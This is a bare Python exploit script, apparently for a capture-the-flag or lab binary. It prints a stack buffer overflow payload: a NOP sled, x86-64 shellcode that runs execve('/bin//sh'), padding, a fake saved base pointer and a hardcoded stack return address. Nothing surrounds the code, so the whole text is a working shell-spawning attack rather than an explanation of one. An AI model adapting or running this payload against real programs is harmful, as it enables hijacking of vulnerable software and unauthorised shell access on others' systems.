import struct 
import sys
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
nops  = b"\x90"*100
rbp   = b"BBBBBBBB"
rip   = struct.pack("<Q", 0x7fffffffe215)#0x7fffffffe2cd+10)
buff  = b"A"*(208-len(shell)-len(nops))
sys.stdout.buffer.write(nops+shell+buff+rbp+rip)
